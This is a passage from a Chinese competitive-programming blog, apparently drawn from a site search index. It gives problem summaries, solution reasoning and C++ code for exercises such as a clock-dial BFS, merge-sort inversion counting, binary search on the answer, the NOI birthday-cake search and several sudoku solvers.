if(!flag){        for(int i = 1; i &lt;= 5; ++i) for(int j = 1; j &lt;= 6; ++j) a[i][j] = b[i][j];        return false;    }    for(int i = 1; i &lt;= 5; ++i){        for(int j = 1; j &lt;= 6; ++j){            printf(\"%d \", res[i][j]);        }        putchar('\\n');    }    return true;}void solve(){    for(int i = 1; i &lt;= 5; ++i){        for(int j = 1; j &lt;= 6; ++j) a[i][j] = read();    }    for(int mask = 0; mask &lt; (1 &lt;&lt; 6); ++mask){        int m = mask;        memset(res, 0, sizeof(res));        for(int i = 1; i &lt;= 6; ++i) res[1][i] = m &amp; 1, m &gt;&gt;= 1;        if(test()) return;    }}int main(){//    freopen(\"input.txt\", \"r\", stdin);    T = read();    for(int i = 1; i &lt;= T; ++i){        printf(\"PUZZLE #%d\\n\", i);        solve();    }}\n\n    \n  \n\n\n10. 拨钟问题\n  \n    \n      题意简述\n\n    \n    \n      有  种拨钟方式, 有  个钟, 求将所有钟都拨到  点的最少次数的拨钟方案.\n\n    \n  \n\n\n    Solution \n    \n       重 for 循环枚举所有状态还是有点非人类了, 我选择 BFS.\n思路很简单, 开一个结构体 Status 表示状态, 其中 c 存当前的钟的状态, step 存初态到这个状态的操作方案, correct 函数用于判断是否所有钟都到 12 点了.\n另外, 为了防止重复搜索, 需要一个 vis 数组记录状态是否被搜索过.\n再写一个简单的 to_int 函数用于把钟的状态映射为唯一的 int 数即可. 最简单的方式就是把 c 看成一个四进制数.\n然后就没啥好说的了.\n时间复杂度 能过.\nAC Code:\n#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;char move[10][6] = {    \"\",    \"ABDE\",    \"ABC\",    \"BCEF\",    \"ADG\",    \"BDEFH\",    \"CFI\",    \"DEGH\",    \"GHI\",    \"EFHI\"}; // 照抄题目的拨钟方式, 不然容易错, 错了很难debugbool vis[1145141];struct Status{    std::vector&lt;int&gt; c; // 0-4 表示各个钟的状态;    std::vector&lt;int&gt; step; // 记录操作步骤    bool correct(){ // 判断是否所有钟都到 12 点了        bool flag = true;        for(int i = 0; i &lt; 9; ++i) if(c[i] % 4 != 0){flag = false; break;}        return flag;    }};int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int to_int(std::vector&lt;int&gt;&amp; c){ // 映射为唯一的 int 数, 把钟看成 4 进制数即可.    int res = 0;    for(int i = 0; i &lt; 9; ++i) res = (res &lt;&lt; 2) + c[i];    return res;}void bfs(){    std::queue&lt;Status&gt; q;    Status s;    for(int i = 0; i &lt; 9; ++i) s.c.push_back(read());    q.push(s); // 初状    while(q.size()){        Status s = q.front(); q.pop();        if(s.correct()){ // 找到了, 直接输出即可, BFS 的层序遍历方式可保证这个就是最优解.            for(int i = 0; i &lt; s.step.size(); ++i) printf(\"%d \", s.step[i]);            return;        }        for(int i = 1; i &lt;= 9; ++i){            Status t = s;            for(int j = 0; move[i][j]; ++j){                t.c[move[i][j] - 'A'] = (t.c[move[i][j] - 'A'] + 1) % 4; // 解析题目给的阴间拨钟方式            }            int t_hash = to_int(t.c);            if(!vis[t_hash]){ // 只有未搜过的状态才放进队列, 不然会爆炸                vis[t_hash] = true;                t.step.push_back(i);                q.push(t);            }        }    }}int main(){    bfs();}\n\n    \n  \n\n\n11. 求排列的逆序数\n  \n    \n      题意简述\n\n    \n    \n      给定一个长为  的序列 , 求  的逆序对数.\n逆序对  定义为  且 .\n\n    \n  \n\n\n    Solution \n    \n      众所周知求逆序对可以用归并排序或者树状数组.\n但我已经忘记树状数组怎么写了, 所以用的归并排序.\n归并排序时, 我们能直接根据要插入的元素的位置计算出它的逆序对数, 累加这个答案进计数器即可.\n归并排序没啥好说的, 计算方式见代码注释.\nAC Code:\n#include &lt;bits/stdc++.h&gt;#define int long long#define MAXN 500005int n, inverse_cnt;int a[MAXN], b[MAXN];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void merge_sort(int l, int r){    if(l &gt;= r) return;    int mid = (l + r) &gt;&gt; 1;    merge_sort(l, mid); merge_sort(mid + 1, r);    int i = l, j = mid + 1, tot = 0;    while(i &lt;= mid and j &lt;= r){        if(a[j] &lt; a[i]){            b[++tot] = a[j++];            inverse_cnt += mid - i + 1;            /*            注意, 这里 i &lt; j 且 a[i] &gt; a[j], 会产生逆序对.            归并排序的特征是, [l, mid] 与 [mid+1, r] 都已经分别升序.            既然 a[j] 比 a[i] 小, 那它肯定比 [i, mid] 中的所有元素都小, 因此它贡献了 (mid - i + 1) 个逆序对.            */        }        else b[++tot] = a[i++]; // 这里 i &lt; j 且 a[i] &lt;= a[j], 不会产生逆序对.    }    while(i &lt;= mid) b[++tot] = a[i++];    while(j &lt;= r) b[++tot] = a[j++];    for(int k = l; k &lt;= r; ++k) a[k] = b[k - l + 1];}signed main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    merge_sort(1, n);    printf(\"%lld\\n\", inverse_cnt);    return 0;}\n\n    \n  \n\n\n12. 最小预算值\n  \n    \n      题意简述\n\n    \n    \n      给定长为  的序列  和正整数 , 要求至多把  分为 连续的  段, 最小化这些连续子段和的最大值.\n\n    \n  \n\n\n    Solution \n    \n      “最小化最大值”, 经典的二分答案转判定.\n有两个点需要注意:\n\n二分时, 初始边界  不应设为 , 而应是 .\n二分有多种写法, 要注意边界的判定和答案的选择, 这里推荐用另一个计数器  来记录可行的答案, 收缩区间时把端点  或  都排除, 这样就不用纠结答案是落在  还是  了.\n\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int a[200005];long long ans;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}bool check(const long long x){    // 贪心判断以 x 作为最大子段和进行划分, 最多能分几段.    // 如果段数不超过 m, 说明 x 这个子段和是可行的.     int seg = 1; // 注意, seg 从 1 开始计算.    long long cnt = a[1];    for(int i = 2; i &lt;= n; ++i){        if(cnt + a[i] &gt; x){            cnt = a[i];            ++seg;        }        else cnt += a[i];    }    return seg &lt;= m;}int main(){    n = read(), m = read();    long long l = -1145141919810LL, r = 0;    for(int i = 1; i &lt;= n; ++i) a[i] = read(), r += a[i], l = l &gt; a[i] ? l : a[i];    while(l &lt;= r){        long long mid = (l + r) &gt;&gt; 1;        if(check(mid)) r = mid - 1, ans = mid; // ans 记录了最小的可行的 mid.        else l = mid + 1; // 边界收缩, 排除端点    }    printf(\"%lld\\n\", ans);    // 以下是另一种写法, 这种写法的思路是让答案落在区间 (l, r], 最后答案即为 r.    /*  while(l &lt; r){        long long mid = (l + r) &gt;&gt; 1;        if(check(mid)) r = mid;        else l = mid + 1;    }    printf(\"%lld\\n\", r);    */}\n\n    \n  \n\n\n13. 林克的蛋糕\n  \n    \n      题意简述\n\n    \n    \n      给定  个物品的体积 , 和整数 , 可以把每个物品分为体积为  的若干份, 要求份数和大于 , 请最大化 .\n与上一题的不同之处在于,  和  是浮点数, 答案保留小数点后  位.\n\n    \n  \n\n\n    Solution \n    \n      浮点数二分, 和整数二分的思路一样, 只需要改一下二分条件即可.\n整数二分条件一般是 l &lt; r 或 l &lt;= r, 浮点数二分改成 r - l &gt; eps, 其中 eps 是自定义的精度.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#define exp 1e-5#define PI 3.1415926535898int n, f;int a[20004];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}bool check(double x){    int cnt = 0;    for(int i = 1; i &lt;= n; ++i) cnt += int(a[i] * a[i] * PI / x);    return cnt &gt; f;}int main(){    n = read(), f = read();    double l = exp, r = 0, ans;    for(int i = 1; i &lt;= n; ++i) a[i] = read(), r += PI * a[i] * a[i];    while(r - l &gt; exp){        double mid = (l + r) / 2;        if(check(mid)){            ans = mid;            l = mid;        }        else r = mid;    }    printf(\"%.3lf\\n\", ans);}\n\n    \n  ","categories":["算法"]},{"title":"程序设计实践 Week2 解题记录","url":"/2025/07/03/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5-Week2-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"\n    .navbar-shrink .page-container .main-content-container table {\n        border-spacing: 0;\n        border-collapse: collapse;\n        width: 100%;\n        overflow: auto;\n        margin-bottom: 1.2rem;\n        box-shadow: var(--redefine-box-shadow-flat);\n        border-radius: 14px;\n    }\n\n    .navbar-shrink .page-container .main-content-container table thead th {\n        border-bottom: 1px solid var(--shadow-color-1);\n        background-color: var(--third-background-color) !important;\n    }\n\n    .navbar-shrink .page-container .main-content-container table thead th:first-child {\n        border-top-left-radius: 14px;\n    }\n\n    .navbar-shrink .page-container .main-content-container table thead th:last-child {\n        border-top-right-radius: 14px;\n    }\n\n    .navbar-shrink .page-container .main-content-container table tbody tr:last-child td:first-child {\n        border-bottom-left-radius: 14px;\n    }\n\n    .navbar-shrink .page-container .main-content-container table tbody tr:last-child td:last-child {\n        border-bottom-right-radius: 14px;\n    }\n\n    .navbar-shrink .page-container .main-content-container table td,\n    .navbar-shrink .page-container .main-content-container table th {\n        padding: 8px 16px;\n        border-left: 1px solid var(--shadow-color-1);\n    }\n\n    .navbar-shrink .page-container .main-content-container table td:first-child,\n    .navbar-shrink .page-container .main-content-container table th:first-child {\n        border-left: none;\n    }\n\n    .navbar-shrink .page-container .main-content-container table tr {\n        background-color: var(--background-color);\n    }\n\n    .navbar-shrink .page-container .main-content-container table tr:nth-child(2n) {\n        background-color: var(--second-background-color);\n    }\n\n\n\n前言Week 2 的题目强度略大, 到周三才推完.\n光是学习 Dancing Links 就花了大半天时间.\n和 Week 1 不一样, 刷完 Week 2 的题后是真的挺有成就感.\n\n1. 英杰们的蛋糕塔 传送门 -- 洛谷 P1731 [NOI1999] 生日蛋糕\n\n\n  \n    \n      题意简述\n\n    \n    \n      给定两个个整数  和 , 请你构造  层叠在一起的圆柱体, 满足:\n\n从下往上, 圆柱体的半径  与高  均严格递减.\n圆柱体的总体积等于 .\n\n在满足上述条件下, 最小化这  层圆柱体的表面积 (不含底面积), 也就是最小化 所有圆柱体的侧面积之和 + 最大圆柱体的底面积. 记表面积为 , 输出  即可.\n数据范围: .\n\n    \n  \n\n\n    Solution \n    \n      搜索题.\n为了便于描述, 我接下来说的 体积、面积, 都是指除以  后的部分.\n从下往上搜和从上往下搜应该都可行, 我选择了前者.\n既然是搜索, 对于每一层, 我们都需要去尝试所有可能的  和  的组合, 然后进入下一层搜索.\n显然  和  的组合越多, 搜索所需要的时间就多, 因此, 最重要的工作就是: 尽可能缩小当前层可选的  和  的范围.\n所谓缩小范围, 就是明确  和  的上下限.\n假设当前层数为 , 已经凑出的体积和面积分别为 , , 上一层的  和  分别为  和  .\n根据半径和高都递减的条件, 首先肯定有: ,  .再假设第  行半径和高都为 , 第  行半径和高为 , , 第  行半径和高都为 , 很容易发现  .\n这个范围还是太大了, 为了进一步缩小  和  的范围, 自然想到利用体积放缩 .\n凑出上面每层所需最小体积\n而 “凑出上面每层所需最小体积” 就是, 第一层半径和高都为 , 第二层半径和高为 , , 第  层半径和高都为 , 累和起来得到的体积.\n把 “凑出前  层所需最小体积” 记为 min_v[i], 显然这个时候它们贡献的侧面积也最小, 记为 min_s[i] , 它们的计算方式为:\n   for(int i = 1; i &lt;= m; ++i){       min_s[i] = min_s[i-1] + (i * i &lt;&lt; 1);\tmin_v[i] = min_v[i-1] + (i * i * i);}\n\n接下来考虑剪枝.\n\n如果 V + min_v[dep] &gt; n , 说明不可能凑出体积 , 剪. (可行性剪枝)\n如果 S + 剩下能凑出的最小面积 &gt;= ans , 说明这种情况不可能比答案更优, 剪. (最优性剪枝)\n\n首先, 剩下能凑出的面积 有个稳定的下界: min_s[dep].其次, 由数学知识容易知道, 在已知剩下部分的体积的情况下, 我们可以估算出剩下部分的最小侧面积.\n再把放缩为常数利用有\n然后, 就是 DFS 入口的确定, 也就是估计第  层的  和  的上限.\n这里我一开始以为要二分 , 但还是先考虑了如下非常宽松的情况:\n\n令  得到  的一个上界  .\n令  得到  的一个上界  .\n\n还好, 这样就能通过.\n公式的推导都写得很详尽了, 代码就不给注释了.\nAC Code:\n/*\\sum{R^2 * H} = NMinimize \\sum{2 * R * H} + \\sum{R_m^2}*/#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int ans = 1145141919;int min_s[200005];int min_v[200005];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}void dfs(int dep, int V, int S, int R_pre, int H_pre){\tif(!dep){\t\tif(V == n) ans = min(ans, S);\t\treturn;\t}\tif(S + min_s[dep] &gt;= ans) return;\tif(V + min_v[dep] &gt; n) return;\tif(2 * (n - V) / R_pre + S &gt;= ans) return;\tfor(int i = R_pre - 1; i &gt;= dep; --i){\t\tif(dep == m) S = i * i; // 如果是最低层, 要加上底面积.\t\tint H_max = min(H_pre - 1, (n - min_v[dep-1] - V) / i / i);\t\tfor(int j = H_max; j &gt;= dep; --j){\t\t\tdfs(dep - 1, V + i * i * j, S + (i * j &lt;&lt; 1), i, j);\t\t}\t}}int main(){\tn = read(), m = read();\tfor(int i = 1; i &lt;= m; ++i){\t\tmin_s[i] = min_s[i-1] + (i * i &lt;&lt; 1);\t\tmin_v[i] = min_v[i-1] + (i * i * i);\t}\tdfs(m, 0, 0, sqrt(n) + 1, n + 1);\tprintf(\"%d\\n\", ans == 1145141919? 0 : ans);}\n\n    \n  \n\n\n2. 击杀黄金蛋糕人马\n  \n    \n      题意简述\n\n    \n    \n      给定一个  的长方形, 通过横着切或竖着切把它分为  块, 在多种切法中, 肯定有让最大块的子长方形面积最小的切法, 求出这个最小面积.\n数据范围:  . \n\n    \n  \n\n\n    Solution \n    \n      在看数据范围之前, 我就想到了一种时间复杂度非常优秀的做法: 二分最小面积, 看切出它的最小刀数是否小于  .\n一看  的上界才  , 谁还想去绞尽脑汁写 checker 呀,  的记忆化搜索比二分好写太多了.\n记 f[w][h][m]: 把  的长方形切成  块, 所有切分中最大块的最小面积.\n然后, 思考怎么拆分子问题.\n很容易想到, 可以枚举下刀的位置, 以及分为两大块后, 左右两块各应该再切成多少块.\n边界情况:  , 此时 f[w][h][m]  .\n一共  个状态, 每个状态会被考虑  次, 时间复杂度  , 虽然很劣, 但可通过此题.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#define INF 0x3f3f3f3fint f[21][21][21];int w, h, m;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch);  ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}int max(int a, int b){return a &gt; b? a : b;}int dfs(int w, int h, int m){    if(m == 1) return w * h;    if(w * h &lt; m) return INF; // m 比面积还大, 不可能分成 m 块的.    if(f[w][h][m]) return f[w][h][m];    int res = INF;    // 枚举横着切的点    for(int i = 1; i &lt; h; ++i){        for(int k = 1; k &lt; m; ++k){            // 一刀分为上下两块, 再递归求解这两块的最大值            int tmp = max(dfs(w, i, k), dfs(w, h - i, m - k));            res = min(res, tmp);        }    }    // 枚举竖着切的点    for(int i = 1; i &lt; w; ++i){        for(int k = 1; k &lt; m; ++k){            // 一刀分为左右两块, 再递归求解这两块的最大值            int tmp = max(dfs(i, h, k), dfs(w - i, h, m - k));            res = min(res, tmp);        }    }    return f[w][h][m] = res;}int main(){    while(1){        w = read(), h = read(), m = read();        if(w == 0 and h == 0 and m == 0) break;        memset(f, 0, sizeof(f));        printf(\"%d\\n\", dfs(w, h, m));    }}\n\n    \n  \n\n\n3. 寻找林克的回忆(1) 传送门 -- 洛谷 P1784 数独\n\n\n  \n    \n      题意简述\n\n    \n    \n      给定一个  的数独, 给出一个可行解.\n\n    \n  \n\n\n    Solution \n    \n      数独有  行,  列,  个宫格, 分别用 row[r][d], col[c][d], block[b1][b2][d] 这三个 bool 数组来记录数字  在第  行、第  列、第  行第  列宫格是否已被使用.\n其中, 可用  快速求出  所在的宫格.\n然后就是普通的 DFS 了.\n时间复杂度最坏为 为空格数 , 但在所给约束条件下, 属于 能过 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int n;bool FLAG;char map[10][10];char in[10000];bool row[10][12];bool col[10][12];bool block[3][3][12];void dfs(int x, int y){    if(FLAG) return;    if(x == 9){        FLAG = true;        for(int i = 0; i &lt; 9; ++i) std::cout &lt;&lt; map[i] &lt;&lt; std::endl;        return;    }    if(y &gt;= 9){dfs(x + 1, 0); return;} // 换行    if(map[x][y] != '0'){dfs(x, y + 1); return;} // 跳过已经填过的点    for(int d = 1; d &lt;= 9; ++d){ // 枚举候选数字, 往下搜        if(row[x][d] or col[y][d] or block[x/3][y/3][d]) continue;        map[x][y] = d + '0';        row[x][d] = col[y][d] = block[x/3][y/3][d] = true;        dfs(x, y + 1);        map[x][y] = '0';        row[x][d] = col[y][d] = block[x/3][y/3][d] = false;    }}int main(){    //freopen(\"input.txt\", \"r\", stdin);    for(int i = 0; i &lt; 9; ++i){        std::cin &gt;&gt; map[i];    }    for(int i = 0; i &lt; 9; ++i){        for(int j = 0; j &lt; 9; ++j){            if(map[i][j] == '0') ++n;            else row[i][map[i][j] xor 48] = col[j][map[i][j] xor 48] = block[i/3][j/3][map[i][j] xor 48] = true;        }    }    dfs(0, 0);}\n\n    \n  \n\n\n4. 寻找林克的回忆(2) 传送门 -- 洛谷 P10481 Sudoku\n\n 传送门 -- 洛谷 P10482 Sudoku 2\n\n\n  \n    \n      题意简述\n\n    \n    \n      给定若干  的数独, 分别给出一个可行解.\n上一题的 能过 算法在这里是 不能过 .\n\n    \n  \n\n\n    Solution \n    \n      爆搜代码过不了, 就需要找优化方法.\n原来的爆搜代码, 是按从上到下, 从左到右的顺序依次填数.\n假如是人来做数独, 人会怎么做?\n我不知道别人是怎么做的, 反正我会先把所有能唯一确定的空先填上, 然后再找候选数最少的空进行尝试, 这样做是有道理的, 比起按顺序填数, 这种做法能够大大减少需要尝试的情况数.\n这种搜索方式就是启发式搜索, 虽然最坏时间复杂度和原来一样, 但平均时间复杂度能减少到  . 只要数据友好, 就能够通过.\n为了高效找到候选数最少的空, 我们不再使用原来的 row, col, block 二维 bool 数组, 而是使用bitmask: 用二进制数描述每个数的使用情况.\n具体来说, 就是用十位二进制数  来描述某个数字  是否被使用, 如果  已被使用, 就把其对应位  置为 , 否则置为 .\n于是, 就可以用 row[i] 表示第  行的使用情况, col[j] 表示第  列的使用情况, block[b1][b2] 表示第  行第  列宫格的使用情况.\n然后使用位运算高效完成这些基本操作:\n(mask 是一个十位二进制数, d 是数字  到 )\n\n\n\n操作\n对应位运算\n\n\n\n数字  是否被使用\nmask &gt;&gt; d &amp; 1\n\n\n标记  为已被使用\nmask |= 1 &lt;&lt; d\n\n\n标记  为未被使用\nmask &amp;= ~(1 &lt;&lt; d)\n\n\n三个 masks 取并\nrow[i] | col[j] | block[b1][b2]\n\n\n显然, 行、列、宫格三个十位二进制数取并后得到的 mask, 就标志了该位置的数字使用情况,  的数量就是候选数的数量, 可先用 __builtin_popcount 求出  的数量, 再用  来减得到  的数量.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int n;bool FLAG;char map[10][10];char in[10000];int row[9], col[9];int block[3][3];int bitmask(int x, int y){    return row[x] | col[y] | block[x/3][y/3];}void dfs(int step){    if(FLAG) return;    if(step == n){        FLAG = true;        for(int i = 0; i &lt; 9; ++i) std::cout &lt;&lt; map[i];        std::cout &lt;&lt; std::endl;    }    // 启发式, 找候选数最少的空    int x = -1, y = -1, mini = 10;    for(int i = 0; i &lt; 9; ++i){        for(int j = 0; j &lt; 9; ++j){            if(map[i][j] != '0') continue;            int mask = bitmask(i, j);            int cnt = 9 - __builtin_popcount(mask);            if(cnt &lt; mini) mini = cnt, x = i, y = j;        }    }    int mask = bitmask(x, y);    for(int d = 1; d &lt;= 9; ++d){        if(mask &gt;&gt; d &amp; 1) continue; // 数字 d 已经被使用        map[x][y] = d xor 48;        row[x] |= 1 &lt;&lt; d;        col[y] |= 1 &lt;&lt; d;         block[x/3][y/3] |= 1 &lt;&lt; d; // 在该空填入 d        dfs(step+1); // 继续搜        map[x][y] = '0';        row[x] &amp;= ~(1 &lt;&lt; d);        col[y] &amp;= ~(1 &lt;&lt; d);        block[x/3][y/3] &amp;= ~(1 &lt;&lt; d); // 回溯: 该空不填 d    }}int main(){//    freopen(\"input.txt\", \"r\", stdin);    std::ios::sync_with_stdio(false);    while(std::cin &gt;&gt; in){        if(strcmp(in, \"end\") == 0) return 0;        FLAG = false; n = 0;        memset(row, false, sizeof(row));        memset(col, false, sizeof(col));        memset(block, false, sizeof(block));        for(int i = 0; i &lt; 9; ++i){            for(int j = 0; j &lt; 9; ++j){                map[i][j] = in[i*9 + j];                if(map[i][j] == '.') map[i][j] = '0', ++n;                else{                    int d = map[i][j] xor 48;                    row[i] |= 1 &lt;&lt; d;                    col[j] |= 1 &lt;&lt; d;                    block[i/3][j/3] |= 1 &lt;&lt; d;                }            }        }        dfs(0);    }}\n\n    \n  \n\n\n5. 寻找林克的回忆(4)\n  \n    \n      题意简述\n\n    \n    \n      给定若干  的数独, 分别给出一个可行解.\n上一题的 能过 算法在这里是 不能过 .\n\n    \n  \n\n\n    Solution \n    \n      读完上题的 Solution 就可以发现, 我上一题在代码实现部分偷懒了, 我并未把所有能唯一确定的空先填上, 而只是找了候选数最少的空进行尝试, 每层搜索只填一个数, 自然不够高效.\n换言之, 我们需要准确实现这个过程: 先把所有能唯一确定的空先填上, 然后再找候选数最少的空进行尝试.\n需要注意的是, “能唯一确定的空” 是相对当前状态而言的, 如果上层搜索所作出的猜测不正确, 那么我们填入的这些 “能唯一确定的空” 就也需要回溯.\n要如何优雅地实现 “启发式回溯” 呢?\n很简单, 和普通的搜索回溯一样, 这里也是要 “撤销” 作出的操作, 唯一的区别就是操作可能不止一次, 自然想到用一个栈来记录所有填能唯一确定的空的操作, 并在开始填这些空时记录原来的操作栈的大小, 就可以在搜索失败后依次还原这些操作了.\nImplementation:\n#include &lt;stack&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int n;char map[17][17];char in[10000];int row[17], col[17];int block[4][4];struct Record{    int r, c, d;};std::stack&lt;Record&gt; stk;int bitmask(int x, int y){    return row[x] | col[y] | block[x/4][y/4];}void undo(int until){    while(stk.size() &gt; until){        Record opt = stk.top(); stk.pop();        map[opt.r][opt.c] = '-';        row[opt.r] &amp;= ~(1 &lt;&lt; opt.d);        col[opt.c] &amp;= ~(1 &lt;&lt; opt.d);        block[opt.r/4][opt.c/4] &amp;= ~(1 &lt;&lt; opt.d);    }}void make(int r, int c, int d){    map[r][c] = 'A' - 1 + d;    row[r] |= 1 &lt;&lt; d;    col[c] |= 1 &lt;&lt; d;    block[r/4][c/4] |= 1 &lt;&lt; d;    stk.push({r, c, d});}bool dfs(int step){//    printf(\"step = %d\\n\", step);    int stk_A = stk.size(); // 记录当前状态    int step_A = step;    // 填所有可唯一确定的数    bool opted = true; // 是否有操作    while(opted){        opted = false;        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                int cnt = 16 - __builtin_popcount(mask);                if(cnt == 0){ // 没有可选的数, 矛盾!                    undo(stk_A);                    return false;                }                if(cnt == 1){                    int d = __builtin_ctz(131070 &amp; ~mask);                    // 使用魔法找出唯一的数, 131070 = (1&lt;&lt;17)-2                /*     等价写法                    int d = 1;                    while((mask &gt;&gt; d &amp; 1)) ++d;                */                        make(i, j, d); ++step; opted = true;                }            }        }    }    // 填完了    if(step == n){        for(int i = 0; i &lt; 16; ++i) std::cout &lt;&lt; map[i] &lt;&lt; std::endl;        return true;    }    int stk_B = stk.size();    int step_B = step;    // 启发式, 找候选数最少的空    int x = -1, y = -1, mini = 17;    for(int i = 0; i &lt; 16; ++i){        for(int j = 0; j &lt; 16; ++j){            if(map[i][j] != '-') continue;            int mask = bitmask(i, j);            int cnt = 16 - __builtin_popcount(mask);            if(cnt &lt; mini) mini = cnt, x = i, y = j;        }    }    int mask = bitmask(x, y);    for(int d = 1; d &lt;= 16; ++d){        if(mask &gt;&gt; d &amp; 1) continue;        make(x, y, d); ++step;        if(dfs(step)) return true; // 递归猜测        undo(stk_B);        step = step_B;    }    undo(stk_A); // 回溯 “可唯一确定的空”    return false; // 这种情况无解}void solve(){    n = 0;    while(stk.size()) stk.pop();    memset(row, 0, sizeof(row));    memset(col, 0, sizeof(col));    memset(block, 0, sizeof(block));    for(int i = 0; i &lt; 16; ++i){        for(int j = 0; j &lt; 16; ++j){            if(map[i][j] == '-') ++n;            else{                int d = map[i][j] - 'A' + 1;                row[i] |= 1 &lt;&lt; d;                col[j] |= 1 &lt;&lt; d;                block[i/4][j/4] |= 1 &lt;&lt; d;            }        }    }    dfs(0);}int main(){//    freopen(\"in.txt\", \"r\", stdin);    std::cin.sync_with_stdio(false);    int i = 0;    while(std::cin &gt;&gt; in){        strcpy(map[i++], in);        if(i == 16){solve(); i = 0;}    }}\n\n但, 还没有结束.\n这份代码  TLE  了.\n最令我伤心的是, 我花了一个晚上 Debug 它 (虽然好像没bug), 最后才发现是因为剪枝还不够强 (sad).\n在这份代码上花了太多时间, 所以尽管它没能  AC , 我还是要把它贴出来.\n那么这份代码为什么无法通过呢?\n因为, 我只考虑了考虑了一个空只能填一个字母的情况, 没考虑一个字母只能填在某个空的情况.\n比如, 在某一行中, 有个空可以填 C 和 F, 其它空都有别的可填字母, 唯独没有 F, 此时 F 就只能填在这个空.\n这是个非常强力的剪枝, 也是现实数独中常用的解题技巧, 但我在写代码时却没考虑到.\n修改后的代码如下:\nbool dfs(int filled){    int now = stk.size(); // 记录当前状态    bool opted = true; // 是否有操作    while(opted){        opted = false;        // 只有 1 个候选数的空        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                int cnt = 16 - __builtin_popcount(mask);                if(cnt == 1){                    int d = __builtin_ctz(131070 &amp; ~mask);                      make(i, j, d); ++filled; opted = true;                }            }        }        // 只可填在 1 个空的字母            // 检查每一行        for(int r = 0; r &lt; 16; ++r){            for(int d = 1; d &lt;= 16; ++d){                if(row[r] &gt;&gt; d &amp; 1) continue; // 用过了, 跳过                int place = 0;                int last = -1;                for(int c = 0; c &lt; 16; ++c){                    int mask = bitmask(r, c);                    if(map[r][c] != '-' or mask &gt;&gt; d &amp; 1) continue;                    ++place, last = c;                }                if(place == 1){ // 只出现 1 次                    make(r, last, d); ++filled; opted = true;                }            }        }            // 检查每一列        for(int c = 0; c &lt; 16; ++c){            for(int d = 1; d &lt;= 16; ++d){                if(col[c] &gt;&gt; d &amp; 1) continue; // 用过了, 跳过                int place = 0;                int last = -1;                for(int r = 0; r &lt; 16; ++r){                    int mask = bitmask(r, c);                    if(map[r][c] != '-' or mask &gt;&gt; d &amp; 1) continue;                    ++place, last = r;                }                if(place == 1){ // 只出现 1 次                                        make(last, c, d); ++filled; opted = true;                }            }        }            // 检查每一个宫        for(int b1 = 0; b1 &lt; 4; ++b1){            for(int b2 = 0; b2 &lt; 4; ++b2){                for(int d = 1; d &lt;= 16; ++d){                    if(block[b1][b2] &gt;&gt; d &amp; 1) continue;                    int place = 0;                    int last = -1;                    for(int r_offset = 0; r_offset &lt; 4; ++r_offset){                        for(int c_offset = 0; c_offset &lt; 4; ++c_offset){                            int r = b1 * 4 + r_offset;                            int c = b2 * 4 + c_offset;                            int mask = bitmask(r, c);                            if(map[r][c] != '-' or mask &gt;&gt; d &amp; 1) continue;                            ++place, last = (r &lt;&lt; 4) | c;                        }                    }                    if(place == 1){ // 只出现 1 次                        int r = last &gt;&gt; 4, c = last &amp; 15;                        make(r, c, d); ++filled; opted = true;                    }                }            }        }                // 如果上面的操作导致矛盾, 就撤回        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                int cnt = 16 - __builtin_popcount(mask);                if(cnt == 0){                    undo(now);                    return false;                }            }        }        // 如果上面的操作导致矛盾, 就撤回        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                if(__builtin_popcount(mask) == 16){                    undo(now);                    return false;                }            }        }    }    // 填完了    if(filled == n){        for(int i = 0; i &lt; 16; ++i) std::cout &lt;&lt; map[i] &lt;&lt; std::endl;        return true;    }    // 启发式, 找候选数最少的空    int x = -1, y = -1, mini = 17;    for(int i = 0; i &lt; 